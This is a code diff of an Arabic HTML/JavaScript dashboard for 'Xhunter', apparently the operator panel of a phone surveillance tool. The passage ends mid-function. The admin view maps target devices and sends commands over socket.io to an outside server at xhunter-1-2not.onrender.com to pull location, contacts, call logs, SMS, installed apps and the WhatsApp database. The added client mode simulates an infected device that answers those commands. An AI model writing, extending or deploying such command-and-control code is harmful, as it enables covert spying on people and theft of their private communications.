@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>نظام استخبارات Xhunter — لوحة التحكم</title>
+    <title>نظام استخبارات Xhunter — لوحة التحكم والعميل</title>
     
     <!-- الخطوط -->
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
@@ -423,166 +423,273 @@
             font-size: 1.2rem;
             cursor: pointer;
         }
+        
+        /* واجهة العميل */
+        .client-panel {
+            padding: 2rem;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .client-card {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(119, 141, 169, 0.3);
+        }
+        
+        .client-card h3 {
+            margin-bottom: 1rem;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .switch-container {
+            position: absolute;
+            top: 1rem;
+            left: 1rem;
+        }
+        
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <header>
-        <div class="title">
-            <i class="fas fa-satellite"></i>
-            نظام استخبارات <span>Xhunter</span>
-        </div>
-        <div class="user">
-            <i class="fas fa-user-secret"></i>
-            مسؤول النظام
-        </div>
-    </header>
-
-    <nav class="topbar">
-        <div class="tabs">
-            <button data-tab="map" class="tab active">
-                <i class="fas fa-map-marked-alt"></i>
-                الخريطة
-            </button>
-            <button data-tab="devices" class="tab">
-                <i class="fas fa-mobile-alt"></i>
-                الأجهزة
-            </button>
-            <button data-tab="data" class="tab">
-                <i class="fas fa-database"></i>
-                بيانات الجهاز
-            </button>
-            <button data-tab="logs" class="tab">
-                <i class="fas fa-clipboard-list"></i>
-                السجل
-            </button>
-            <button data-tab="commands" class="tab">
-                <i class="fas fa-terminal"></i>
-                الأوامر
-            </button>
-        </div>
-        <div class="controls">
-            <div class="status" id="statusIndicator">
-                <i class="fas fa-plug"></i>
-                أجهزة متصلة: <span id="statusCount">0</span>
-            </div>
-            <div class="last">
-                <i class="fas fa-clock"></i>
-                آخر حدث: <span id="lastEvent">—</span>
-            </div>
-        </div>
-    </nav>
-
-    <main id="main">
-        <!-- خريطة -->
-        <section id="tab-map" class="panel active">
-            <div id="map"></div>
-            <div class="map-controls" style="margin-top: 1rem; display: flex; gap: 0.5rem;">
-                <button class="secondary" id="refreshMap">
-                    <i class="fas fa-sync"></i> تحديث الخريطة
-                </button>
-                <button class="secondary" id="zoomIn">
-                    <i class="fas fa-search-plus"></i> تكبير
-                </button>
-                <button class="secondary" id="zoomOut">
-                    <i class="fas fa-search-minus"></i> تصغير
-                </button>
-            </div>
-        </section>
-
-        <!-- أجهزة -->
-        <section id="tab-devices" class="panel">
-            <h3><i class="fas fa-mobile-alt"></i> الأجهزة المتصلة</h3>
-            <div class="progress-bar">
-                <div class="progress" id="devicesProgress" style="width: 75%"></div>
-            </div>
-            <div id="deviceList" class="list" style="margin-top: 1.5rem;">
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <span style="margin-right: 10px;">جاري تحميل البيانات...</span>
-                </div>
-            </div>
-        </section>
-
-        <!-- بيانات الجهاز المحدد -->
-        <section id="tab-data" class="panel">
-            <h3><i class="fas fa-database"></i> بيانات الجهاز</h3>
-            <p>اختر جهازاً من تبويب "الأجهزة" لعرض بياناته</p>
-            <div id="deviceInfo" class="data-grid" style="margin-top: 1.5rem;">
-                <div class="data-card">
-                    <h4><i class="fas fa-info-circle"></i> معلومات الجهاز</h4>
-                    <p>لم يتم اختيار أي جهاز بعد</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- السجل -->
-        <section id="tab-logs" class="panel">
-            <h3><i class="fas fa-clipboard-list"></i> سجل الأحداث</h3>
-            <div class="progress-bar">
-                <div class="progress" id="logsProgress" style="width: 60%"></div>
-            </div>
-            <div class="list" id="logList" style="margin-top: 1.5rem;">
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <span style="margin-right: 10px;">جاري تحميل السجلات...</span>
-                </div>
-            </div>
-        </section>
-
-        <!-- الأوامر -->
-        <section id="tab-commands" class="panel">
-            <h3><i class="fas fa-terminal"></i> إصدار أوامر</h3>
-            
-            <div class="form-row">
-                <label for="deviceSelect">الجهاز المستهدف:</label>
-                <select id="deviceSelect" class="full">
-                    <option value="">-- اختر جهاز --</option>
-                </select>
-            </div>
-            
-            <div class="form-row">
-                <label for="commandAction">نوع الأمر:</label>
-                <select id="commandAction" class="full">
-                    <option value="getLocation">طلب الموقع (Lock)</option>
-                    <option value="getInstalledApps">التطبيقات المثبتة</option>
-                    <option value="getContacts">جهات الاتصال</option>
-                    <option value="getCallLog">سجل المكالمات</option>
-                    <option value="getSMS">الرسائل</option>
-                    <option value="downloadWhatsappDatabase">واتساب (DB)</option>
-                    <option value="getExtraData">بيانات إضافية</option>
-                </select>
-            </div>
-            
-            <div class="form-row">
-                <label for="commandData">بيانات إضافية (JSON):</label>
-                <input id="commandData" placeholder='{"key": "value"}' class="full"/>
-            </div>
-            
-            <div class="form-row" style="display: flex; gap: 0.5rem; margin-top: 1.5rem;">
-                <button id="sendCommand" class="primary">
-                    <i class="fas fa-paper-plane"></i> إرسال الأمر
-                </button>
-                <button id="clearLogs" class="secondary">
-                    <i class="fas fa-trash"></i> مسح السجل
-                </button>
-            </div>
-            
-            <div id="commandStatus" style="margin-top: 1rem; padding: 1rem; background: var(--card-bg); border-radius: 6px; display: none;">
-                <i class="fas fa-circle-notch fa-spin"></i> جاري معالجة الأمر...
-            </div>
-        </section>
-    </main>
-
-    <div id="notification" class="notification">
-        <div id="notificationMessage"></div>
-        <button class="close" onclick="hideNotification()">
-            <i class="fas fa-times"></i>
+    <div class="switch-container">
+        <button id="switchMode" class="secondary">
+            <i class="fas fa-exchange-alt"></i> التبديل إلى وضع العميل
         </button>
     </div>
 
-    <footer class="footer">
-        <i class="fas fa-shield-alt"></i> Xhunter • لوحة الاستخبارات — جاهز للعمل
-    </footer>
+    <!-- واجهة الإدارة -->
+    <div id="admin-interface">
+        <header>
+            <div class="title">
+                <i class="fas fa-satellite"></i>
+                نظام استخبارات <span>Xhunter</span>
+            </div>
+            <div class="user">
+                <i class="fas fa-user-secret"></i>
+                مسؤول النظام
+            </div>
+        </header>
+
+        <nav class="topbar">
+            <div class="tabs">
+                <button data-tab="map" class="tab active">
+                    <i class="fas fa-map-marked-alt"></i>
+                    الخريطة
+                </button>
+                <button data-tab="devices" class="tab">
+                    <i class="fas fa-mobile-alt"></i>
+                    الأجهزة
+                </button>
+                <button data-tab="data" class="tab">
+                    <i class="fas fa-database"></i>
+                    بيانات الجهاز
+                </button>
+                <button data-tab="logs" class="tab">
+                    <i class="fas fa-clipboard-list"></i>
+                    السجل
+                </button>
+                <button data-tab="commands" class="tab">
+                    <i class="fas fa-terminal"></i>
+                    الأوامر
+                </button>
+            </div>
+            <div class="controls">
+                <div class="status" id="statusIndicator">
+                    <i class="fas fa-plug"></i>
+                    أجهزة متصلة: <span id="statusCount">0</span>
+                </div>
+                <div class="last">
+                    <i class="fas fa-clock"></i>
+                    آخر حدث: <span id="lastEvent">—</span>
+                </div>
+            </div>
+        </nav>
+
+        <main id="main">
+            <!-- خريطة -->
+            <section id="tab-map" class="panel active">
+                <div id="map"></div>
+                <div class="map-controls" style="margin-top: 1rem; display: flex; gap: 0.5rem;">
+                    <button class="secondary" id="refreshMap">
+                        <i class="fas fa-sync"></i> تحديث الخريطة
+                    </button>
+                    <button class="secondary" id="zoomIn">
+                        <i class="fas fa-search-plus"></i> تكبير
+                    </button>
+                    <button class="secondary" id="zoomOut">
+                        <i class="fas fa-search-minus"></i> تصغير
+                    </button>
+                </div>
+            </section>
+
+            <!-- أجهزة -->
+            <section id="tab-devices" class="panel">
+                <h3><i class="fas fa-mobile-alt"></i> الأجهزة المتصلة</h3>
+                <div class="progress-bar">
+                    <div class="progress" id="devicesProgress" style="width: 75%"></div>
+                </div>
+                <div id="deviceList" class="list" style="margin-top: 1.5rem;">
+                    <div class="loading">
+                        <div class="spinner"></div>
+                        <span style="margin-right: 10px;">جاري تحميل البيانات...</span>
+                    </div>
+                </div>
+            </section>
+
+            <!-- بيانات الجهاز المحدد -->
+            <section id="tab-data" class="panel">
+                <h3><i class="fas fa-database"></i> بيانات الجهاز</h3>
+                <p>اختر جهازاً من تبويب "الأجهزة" لعرض بياناته</p>
+                <div id="deviceInfo" class="data-grid" style="margin-top: 1.5rem;">
+                    <div class="data-card">
+                        <h4><i class="fas fa-info-circle"></i> معلومات الجهاز</h4>
+                        <p>لم يتم اختيار أي جهاز بعد</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- السجل -->
+            <section id="tab-logs" class="panel">
+                <h3><i class="fas fa-clipboard-list"></i> سجل الأحداث</h3>
+                <div class="progress-bar">
+                    <div class="progress" id="logsProgress" style="width: 60%"></div>
+                </div>
+                <div class="list" id="logList" style="margin-top: 1.5rem;">
+                    <div class="loading">
+                        <div class="spinner"></div>
+                        <span style="margin-right: 10px;">جاري تحميل السجلات...</span>
+                    </div>
+                </div>
+            </section>
+
+            <!-- الأوامر -->
+            <section id="tab-commands" class="panel">
+                <h3><i class="fas fa-terminal"></i> إصدار أوامر</h3>
+                
+                <div class="form-row">
+                    <label for="deviceSelect">الجهاز المستهدف:</label>
+                    <select id="deviceSelect" class="full">
+                        <option value="">-- اختر جهاز --</option>
+                    </select>
+                </div>
+                
+                <div class="form-row">
+                    <label for="commandAction">نوع الأمر:</label>
+                    <select id="commandAction" class="full">
+                        <option value="getLocation">طلب الموقع (Lock)</option>
+                        <option value="getInstalledApps">التطبيقات المثبتة</option>
+                        <option value="getContacts">جهات الاتصال</option>
+                        <option value="getCallLog">سجل المكالمات</option>
+                        <option value="getSMS">الرسائل</option>
+                        <option value="downloadWhatsappDatabase">واتساب (DB)</option>
+                        <option value="getExtraData">بيانات إضافية</option>
+                    </select>
+                </div>
+                
+                <div class="form-row">
+                    <label for="commandData">بيانات إضافية (JSON):</label>
+                    <input id="commandData" placeholder='{"key": "value"}' class="full"/>
+                </div>
+                
+                <div class="form-row" style="display: flex; gap: 0.5rem; margin-top: 1.5rem;">
+                    <button id="sendCommand" class="primary">
+                        <i class="fas fa-paper-plane"></i> إرسال الأمر
+                    </button>
+                    <button id="clearLogs" class="secondary">
+                        <i class="fas fa-trash"></i> مسح السجل
+                    </button>
+                </div>
+                
+                <div id="commandStatus" style="margin-top: 1rem; padding: 1rem; background: var(--card-bg); border-radius: 6px; display: none;">
+                    <i class="fas fa-circle-notch fa-spin"></i> جاري معالجة الأمر...
+                </div>
+            </section>
+        </main>
+
+        <div id="notification" class="notification">
+            <div id="notificationMessage"></div>
+            <button class="close" onclick="hideNotification()">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+
+        <footer class="footer">
+            <i class="fas fa-shield-alt"></i> Xhunter • لوحة الاستخبارات — جاهز للعمل
+        </footer>
+    </div>
+
+    <!-- واجهة العميل -->
+    <div id="client-interface" class="hidden">
+        <header>
+            <div class="title">
+                <i class="fas fa-mobile-alt"></i>
+                عميل <span>Xhunter</span>
+            </div>
+        </header>
+
+        <div class="client-panel">
+            <div class="client-card">
+                <h3><i class="fas fa-plug"></i> حالة الاتصال</h3>
+                <div id="clientStatus">
+                    <p>جاري الاتصال بالخادم...</p>
+                    <div class="progress-bar">
+                        <div class="progress" id="clientProgress"></div>
+                    </div>
+                </div>
+                <button id="connectClient" class="primary" style="margin-top: 1rem;">
+                    <i class="fas fa-link"></i> الاتصال بالخادم
+                </button>
+            </div>
+
+            <div class="client-card">
+                <h3><i class="fas fa-info-circle"></i> معلومات الجهاز</h3>
+                <div class="form-row">
+                    <label for="clientId">معرف الجهاز:</label>
+                    <input type="text" id="clientId" class="full" value="device_001" />
+                </div>
+                <div class="form-row">
+                    <label for="clientName">اسم الجهاز:</label>
+                    <input type="text" id="clientName" class="full" value="جهاز الاختبار" />
+                </div>
+            </div>
+
+            <div class="client-card">
+                <h3><i class="fas fa-cogs"></i> إرسال البيانات</h3>
+                <div class="form-row">
+                    <label for="dataType">نوع البيانات:</label>
+                    <select id="dataType" class="full">
+                        <option value="location">الموقع الجغرافي</option>
+                        <option value="battery">حالة البطارية</option>
+                        <option value="deviceInfo">معلومات الجهاز</option>
+                        <option value="networkInfo">معلومات الشبكة</option>
+                    </select>
+                </div>
+                <button id="sendData" class="primary" style="margin-top: 1rem;">
+                    <i class="fas fa-paper-plane"></i> إرسال البيانات
+                </button>
+            </div>
+
+            <div class="client-card">
+                <h3><i class="fas fa-history"></i> سجل الإرسال</h3>
+                <div id="clientLogs" style="height: 200px; overflow-y: auto; background: rgba(13, 27, 42, 0.7); padding: 1rem; border-radius: 4px;">
+                    <p>لم يتم إرسال أي بيانات بعد</p>
+                </div>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <i class="fas fa-mobile-alt"></i> عميل Xhunter • متصل بالخادم المركزي
+        </footer>
+    </div>
 
     <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
     <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
@@ -607,14 +714,27 @@
         const zoomOutBtn = document.getElementById('zoomOut');
         const notification = document.getElementById('notification');
         const notificationMessage = document.getElementById('notificationMessage');
+        const switchModeBtn = document.getElementById('switchMode');
+        const adminInterface = document.getElementById('admin-interface');
+        const clientInterface = document.getElementById('client-interface');
+        const connectClientBtn = document.getElementById('connectClient');
+        const clientIdInput = document.getElementById('clientId');
+        const clientNameInput = document.getElementById('clientName');
+        const dataTypeSelect = document.getElementById('dataType');
+        const sendDataBtn = document.getElementById('sendData');
+        const clientLogs = document.getElementById('clientLogs');
+        const clientStatus = document.getElementById('clientStatus');
 
         // بيانات التطبيق
-        let devices = [];            // مصفوفة الأجهزة (نحافظ على واجهة العرض كما هي)
+        let devices = [];
         let map = null;
         let markers = {};
         let selectedDevice = null;
         let socket = null;
         let isConnected = false;
+        let clientSocket = null;
+        let isClientMode = false;
+        let clientDeviceId = 'device_001';
 
         // وظائف الإشعارات
         function showNotification(message, type = '') {
@@ -634,55 +754,26 @@
             notification.classList.remove('show');
         }
 
-        // ---------- دوال مساعدة للتعامل مع بيانات السيرفر ----------
-        function findDeviceIndex(id) {
-            return devices.findIndex(d => d && d.id === id);
-        }
-
-        function normalizeServerDevice(d) {
-            // يحوّل شكل الجهاز القادم من السيرفر إلى الحقول التي يتوقعها الواجهة (name, id, lat, lng, lastSeen, os, ...)
-            const out = Object.assign({}, d);
-            // اسم الجهاز: model أو name أو userAgent
-            out.name = out.name || out.model || out.userAgent || out.id;
-            // lastLocation إلى lat/lng
-            if (out.lastLocation) {
-                const loc = out.lastLocation;
-                // قد تكون الحقول lat/lon أو latitude/longitude
-                out.lat = loc.lat ?? loc.latitude ?? loc.lat;
-                out.lng = loc.lon ?? loc.longitude ?? loc.lng;
-                if (loc.accuracy) out.accuracy = loc.accuracy;
-            }
-            // قد يرسل السيرفر حقول منفصلة عن الموقع عبر device.lastLocation أو device.location
-            if (out.location) {
-                out.lat = out.lat ?? out.location.lat ?? out.location.latitude;
-                out.lng = out.lng ?? out.location.lon ?? out.location.longitude;
-            }
-            // lastSeen: إذا أتى كرقم (timestamp) نحتفظ به، وإلا نضع الآن
-            out.lastSeen = out.lastSeen ? out.lastSeen : (Date.now());
-            return out;
-        }
-
-        function upsertDeviceFromServer(deviceObj) {
-            if (!deviceObj || !deviceObj.id) return null;
-            const normalized = normalizeServerDevice(deviceObj);
-            const idx = findDeviceIndex(normalized.id);
-            if (idx === -1) {
-                devices.push(normalized);
-                return normalized;
+        // تبديل الوضع بين الإدارة والعميل
+        function toggleMode() {
+            isClientMode = !isClientMode;
+            
+            if (isClientMode) {
+                adminInterface.classList.add('hidden');
+                clientInterface.classList.remove('hidden');
+                switchModeBtn.innerHTML = '<i class="fas fa-exchange-alt"></i> التبديل إلى وضع الإدارة';
+                initClient();
             } else {
-                // ندمج الحقول (لا نحذف الحقول الموجودة)
-                devices[idx] = { ...devices[idx], ...normalized };
-                return devices[idx];
+                adminInterface.classList.remove('hidden');
+                clientInterface.classList.add('hidden');
+                switchModeBtn.innerHTML = '<i class="fas fa-exchange-alt"></i> التبديل إلى وضع العميل';
+                if (clientSocket) {
+                    clientSocket.disconnect();
+                    clientSocket = null;
+                }
+                initAdmin();
             }
         }
-
-        function updateAllViews() {
-            statusCount.textContent = devices.length;
-            updateDeviceList(devices);
-            updateDeviceSelect(devices);
-            updateMap(devices);
-        }
-        // --------------------------------------------------------
 
         // تهيئة الخريطة
         function initMap() {
@@ -693,11 +784,11 @@
             }).addTo(map);
         }
 
-        // تحديث قائمة الأجهزة (لم أغير هذه الدالة — تعمل على مصفوفة devices كما كانت)
+        // تحديث قائمة الأجهزة
         function updateDeviceList(devicesData) {
             deviceList.innerHTML = '';
             
-            if (!devicesData || devicesData.length === 0) {
+            if (devicesData.length === 0) {
                 deviceList.innerHTML = '<div class="device-card">لا توجد أجهزة متصلة</div>';
                 return;
             }
@@ -711,9 +802,9 @@
                         <div class="device-id">${device.id}</div>
                     </div>
                     <div class="device-details">
-                        <div><i class="fas fa-clock"></i> آخر ظهور: ${device.lastSeen ? new Date(device.lastSeen).toLocaleString('ar-SA') : '—'}</div>
-                        <div><i class="fas fa-map-marker-alt"></i> الموقع: ${device.lat != null ? Number(device.lat).toFixed(4) : 'N/A'}, ${device.lng != null ? Number(device.lng).toFixed(4) : 'N/A'}</div>
-                        <div><i class="fas fa-satellite"></i> الحالة: ${device.socketId ? 'متصل' : 'غير متصل'}</div>
+                        <div><i class="fas fa-clock"></i> آخر ظهور: ${new Date(device.lastSeen).toLocaleString('ar-SA')}</div>
+                        <div><i class="fas fa-map-marker-alt"></i> الموقع: ${device.lat ? device.lat.toFixed(4) : 'N/A'}, ${device.lng ? device.lng.toFixed(4) : 'N/A'}</div>
+                        <div><i class="fas fa-satellite"></i> الحالة: متصل</div>
                     </div>
                 `;
                 
@@ -740,18 +831,17 @@
 
         // تحديث الخريطة
         function updateMap(devicesData) {
-            if (!map) return;
             // إزالة العلامات القديمة
             for (const id in markers) {
-                try { map.removeLayer(markers[id]); } catch(e){}
+                map.removeLayer(markers[id]);
             }
             markers = {};
             
             // إضافة العلامات الجديدة
             devicesData.forEach(device => {
-                if (device.lat != null && device.lng != null && !isNaN(device.lat) && !isNaN(device.lng)) {
+                if (device.lat && device.lng) {
                     const marker = L.marker([device.lat, device.lng]).addTo(map)
-                        .bindPopup(`<b>${device.name || 'جهاز غير معروف'}</b><br>آخر ظهور: ${device.lastSeen ? new Date(device.lastSeen).toLocaleString('ar-SA') : '—'}`);
+                        .bindPopup(`<b>${device.name || 'جهاز غير معروف'}</b><br>آخر ظهور: ${new Date(device.lastSeen).toLocaleString('ar-SA')}`);
                     
                     markers[device.id] = marker;
                 }
@@ -774,13 +864,13 @@
                     <h4><i class="fas fa-info-circle"></i> معلومات الأساسية</h4>
                     <p><strong>اسم الجهاز:</strong> ${device.name || 'غير معروف'}</p>
                     <p><strong>المعرف:</strong> ${device.id}</p>
-                    <p><strong>آخر ظهور:</strong> ${device.lastSeen ? new Date(device.lastSeen).toLocaleString('ar-SA') : '—'}</p>
+                    <p><strong>آخر ظهور:</strong> ${new Date(device.lastSeen).toLocaleString('ar-SA')}</p>
                     <p><strong>نظام التشغيل:</strong> ${device.os || 'غير معروف'}</p>
                 </div>
                 
                 <div class="data-card">
                     <h4><i class="fas fa-map-marked-alt"></i> الموقع</h4>
-                    <p><strong>الإحداثيات:</strong> ${device.lat != null ? Number(device.lat).toFixed(6) : 'N/A'}, ${device.lng != null ? Number(device.lng).toFixed(6) : 'N/A'}</p>
+                    <p><strong>الإحداثيات:</strong> ${device.lat ? device.lat.toFixed(6) : 'N/A'}, ${device.lng ? device.lng.toFixed(6) : 'N/A'}</p>
                     <p><strong>الدقة:</strong> ≈ ${device.accuracy || 'غير معروف'} متر</p>
                     ${device.address ? `<p><strong>العنوان:</strong> ${device.address}</p>` : ''}
                 </div>
@@ -794,9 +884,9 @@
             `;
             
             // توجيه الخريطة إلى موقع الجهاز
-            if (map && device.lat != null && device.lng != null && markers[device.id]) {
+            if (map && device.lat && device.lng && markers[device.id]) {
                 map.setView([device.lat, device.lng], 15);
-                try { markers[device.id].openPopup(); } catch(e){}
+                markers[device.id].openPopup();
             }
         }
 
@@ -851,7 +941,15 @@
             lastEvent.textContent = new Date().toLocaleString('ar-SA');
         }
 
-        // ---------- الاتصال بالخادم (معدّل ليتوافق مع server.js) ----------
+        // إضافة سجل للعميل
+        function addClientLog(message) {
+            const logEntry = document.createElement('p');
+            logEntry.innerHTML = `<span style="color: var(--accent)">${new Date().toLocaleTimeString('ar-SA')}</span> - ${message}`;
+            clientLogs.appendChild(logEntry);
+            clientLogs.scrollTop = clientLogs.scrollHeight;
+        }
+
+        // الاتصال بالخادم (وضع الإدارة)
         function connectToServer() {
             try {
                 socket = io('https://xhunter-1-2not.onrender.com', {
@@ -866,7 +964,7 @@
                     showNotification('تم الاتصال بالخادم بنجاح', 'success');
                     addLog('تم الاتصال بالخادم بنجاح', 'success');
                     
-                    // اطلب لقطة الأجهزة (السيرفر يرد بإرسال حدث 'join' لكل جهاز)
+                    // طلب بيانات الأجهزة بعد الاتصال
                     socket.emit('adminJoin');
                 });
                 
@@ -881,86 +979,27 @@
                 socket.on('connect_error', (error) => {
                     console.error('خطأ في الاتصال:', error);
                     showNotification('فشل في الاتصال بالخادم', 'error');
-                    addLog('فشل في الاتصال بالخادم: ' + (error.message || error), 'error');
+                    addLog('فشل في الاتصال بالخادم: ' + error.message, 'error');
                 });
-
-                // ----- التوافق: لو السيرفر قديمًا أرسل مصفوفة devices (احتمالي) -----
+                
                 socket.on('devices', (devicesData) => {
-                    // توافق رجعي: لو استلمنا مصفوفة، نستخدمها كما في الكود القديم
-                    if (Array.isArray(devicesData)) {
-                        devices = devicesData.map(d => normalizeServerDevice(d));
-                        updateAllViews();
-                        addLog(`تم استقبال بيانات ${devices.length} جهاز`, 'success');
+                    devices = devicesData;
+                    statusCount.textContent = devices.length;
+                    updateDeviceList(devices);
+                    updateDeviceSelect(devices);
+                    updateMap(devices);
+                    addLog(`تم استقبال بيانات ${devices.length} جهاز`, 'success');
+                });
+                
+                socket.on('deviceData', (data) => {
+                    addLog(`تم استقبال بيانات من الجهاز ${data.deviceId}: ${data.type}`, 'success');
+                    
+                    // تحديث بيانات الجهاز المحدد إذا كان معروضًا
+                    if (selectedDevice && selectedDevice.id === data.deviceId) {
+                        selectDevice({...selectedDevice, ...data.data});
                     }
                 });
-
-                // ----- الـ event الأهم: انضمام جهاز (server.js يرسل 'join' لكل جهاز) -----
-                socket.on('join', (device) => {
-                    const dev = upsertDeviceFromServer(device);
-                    updateAllViews();
-                    addLog(`انضم/تحدث جهاز: ${dev.id}`, 'success');
-                });
-
-                // ----- تحديثات متفرقة من السيرفر: deviceInfo, battery, networkInfo, getLocation, photo, audio, ... -----
-                const serverEvents = ['deviceInfo','battery','networkInfo','getLocation','photo','audio',
-                                      'getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
-                serverEvents.forEach(ev => {
-                    socket.on(ev, (payload) => {
-                        // payload متوقع بالشكل { id, data } أو { id, extra } أو في بعض الأحيان شكل آخر
-                        const id = payload && (payload.id || payload.deviceId);
-                        if (!id) {
-                            // قد يكون السيرفر أرسل شكل الجهاز كاملاً
-                            if (payload && payload.id) {
-                                const dev = upsertDeviceFromServer(payload);
-                                updateAllViews();
-                                addLog(`حدث ${ev} (payload كتلة جهاز) لـ ${dev.id}`, 'info');
-                            }
-                            return;
-                        }
-
-                        // تأكد وجود الجهاز بالسجل
-                        let idx = findDeviceIndex(id);
-                        if (idx === -1) {
-                            devices.push({ id });
-                            idx = devices.length - 1;
-                        }
-
-                        // البيانات الفعلية
-                        const data = payload.data ?? payload.extra ?? payload;
-
-                        // إذا كانت بيانات الموقع
-                        if (ev === 'getLocation' || (data && (data.lat || data.lon || data.latitude || data.longitude))) {
-                            const lat = data.lat ?? data.latitude ?? data.latitude;
-                            const lng = data.lon ?? data.longitude ?? data.lng;
-                            if (lat != null && lng != null) {
-                                devices[idx].lat = Number(lat);
-                                devices[idx].lng = Number(lng);
-                                devices[idx].accuracy = data.accuracy ?? devices[idx].accuracy;
-                            }
-                        }
-
-                        // بعض التحديثات تحفظ مباشرة
-                        if (ev === 'battery') devices[idx].battery = data;
-                        if (ev === 'networkInfo') devices[idx].network = data;
-                        if (ev === 'deviceInfo') {
-                            // server.js يرسل { id, extra }
-                            devices[idx].extra = data;
-                            // حاول استخراج بعض الحقول من extra إن وجدت
-                            if (data && data.model) devices[idx].name = devices[idx].name || data.model;
-                            if (data && data.os) devices[idx].os = devices[idx].os || data.os;
-                        }
-
-                        // حدث عام: نحدث lastSeen و socketId إن توافر
-                        devices[idx].lastSeen = Date.now();
-                        if (payload.socketId) devices[idx].socketId = payload.socketId;
-                        if (payload.socket) devices[idx].socketId = payload.socket;
-
-                        updateAllViews();
-                        addLog(`وصل تحديث (${ev}) من ${id}`, 'info');
-                    });
-                });
-
-                // نتائج الأوامر (إن أعادها السيرفر)
+                
                 socket.on('commandResult', (result) => {
                     commandStatus.style.display = 'none';
                     if (result.success) {
@@ -971,10 +1010,10 @@
                         showNotification(`فشل في تنفيذ الأمر: ${result.message}`, 'error');
                     }
                 });
-
+                
                 socket.on('error', (error) => {
-                    addLog(`خطأ: ${error && error.message ? error.message : JSON.stringify(error)}`, 'error');
-                    showNotification(`خطأ: ${error && error.message ? error.message : 'حدث خطأ'}`, 'error');
+                    addLog(`خطأ: ${error.message}`, 'error');
+                    showNotification(`خطأ: ${error.message}`, 'error');
                 });
                 
                 socket.on('log', (log) => {
@@ -988,8 +1027,200 @@
             }
         }
 
-        // تهيئة التطبيق
-        function initApp() {
+        // تهيئة العميل
+        function initClient() {
+            clientDeviceId = clientIdInput.value;
+            
+            // تحديث حالة العميل
+            clientStatus.innerHTML = `
+                <p>جاري الاتصال بالخادم...</p>
+                <div class="progress-bar">
+                    <div class="progress" id="clientProgress"></div>
+                </div>
+            `;
+            
+            addClientLog('جاري تهيئة العميل...');
+        }
+
+        // الاتصال بالخادم (وضع العميل)
+        function connectClientToServer() {
+            try {
+                clientDeviceId = clientIdInput.value;
+                const deviceName = clientNameInput.value;
+                
+                clientSocket = io('https://xhunter-1-2not.onrender.com', {
+                    transports: ['websocket'],
+                    timeout: 10000
+                });
+                
+                clientSocket.on('connect', () => {
+                    clientStatus.innerHTML = `
+                        <p style="color: var(--success)"><i class="fas fa-check-circle"></i> متصل بالخادم</p>
+                        <div class="progress-bar">
+                            <div class="progress" style="width: 100%; background: var(--success)"></div>
+                        </div>
+                    `;
+                    
+                    addClientLog('تم الاتصال بالخادم بنجاح');
+                    
+                    // إرسال بيانات انضمام الجهاز
+                    clientSocket.emit('join', {
+                        id: clientDeviceId,
+                        name: deviceName,
+                        model: navigator.userAgent,
+                        language: navigator.language,
+                        screen: { width: screen.width, height: screen.height },
+                        platform: navigator.platform,
+                        cookiesEnabled: navigator.cookieEnabled,
+                        ip: '127.0.0.1' // سيتم استبدالها من قبل الخادم
+                    });
+                    
+                    addClientLog('تم إرسال بيانات الجهاز إلى الخادم');
+                });
+                
+                clientSocket.on('disconnect', () => {
+                    clientStatus.innerHTML = `
+                        <p style="color: var(--danger)"><i class="fas fa-times-circle"></i> غير متصل</p>
+                        <div class="progress-bar">
+                            <div class="progress" style="width: 0%"></div>
+                        </div>
+                    `;
+                    addClientLog('تم قطع الاتصال بالخادم');
+                });
+                
+                clientSocket.on('connect_error', (error) => {
+                    console.error('خطأ في الاتصال:', error);
+                    clientStatus.innerHTML = `
+                        <p style="color: var(--danger)"><i class="fas fa-times-circle"></i> فشل في الاتصال</p>
+                        <div class="progress-bar">
+                            <div class="progress" style="width: 0%"></div>
+                        </div>
+                    `;
+                    addClientLog('فشل في الاتصال بالخادم: ' + error.message);
+                });
+                
+                // استقبال الأوامر من الخادم
+                clientSocket.on('getLocation', (data) => {
+                    addClientLog('تم استلام طلب للحصول على الموقع');
+                    
+                    // محاكاة الحصول على الموقع
+                    const locationData = {
+                        lat: 24.7136 + (Math.random() * 0.05 - 0.025),
+                        lng: 46.6753 + (Math.random() * 0.05 - 0.025),
+                        accuracy: Math.floor(Math.random() * 100) + 10
+                    };
+                    
+                    // إرسال الموقع إلى الخادم
+                    clientSocket.emit('getLocation', {
+                        id: clientDeviceId,
+                        data: locationData
+                    });
+                    
+                    addClientLog('تم إرسال بيانات الموقع إلى الخادم');
+                });
+                
+                // معالجة الأحداث الأخرى
+                const otherEvents = ['getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase','getExtraData'];
+                otherEvents.forEach(ev => {
+                    clientSocket.on(ev, (data) => {
+                        addClientLog(`تم استلام أمر: ${ev}`);
+                        
+                        // محاكاة استجابة للخادم
+                        const response = { status: 'success', message: 'تم تنفيذ الأمر' };
+                        
+                        clientSocket.emit(ev, {
+                            id: clientDeviceId,
+                            data: response
+                        });
+                        
+                        addClientLog(`تم إرسال استجابة لأمر: ${ev}`);
+                    });
+                });
+                
+            } catch (error) {
+                console.error('خطأ في تهيئة اتصال العميل:', error);
+                addClientLog('حدث خطأ أثناء الاتصال بالخادم: ' + error.message);
+            }
+        }
+
+        // إرسال بيانات من العميل
+        function sendClientData() {
+            if (!clientSocket || !clientSocket.connected) {
+                addClientLog('غير متصل بالخادم. يرجى الاتصال أولاً.');
+                return;
+            }
+            
+            const dataType = dataTypeSelect.value;
+            
+            switch(dataType) {
+                case 'location':
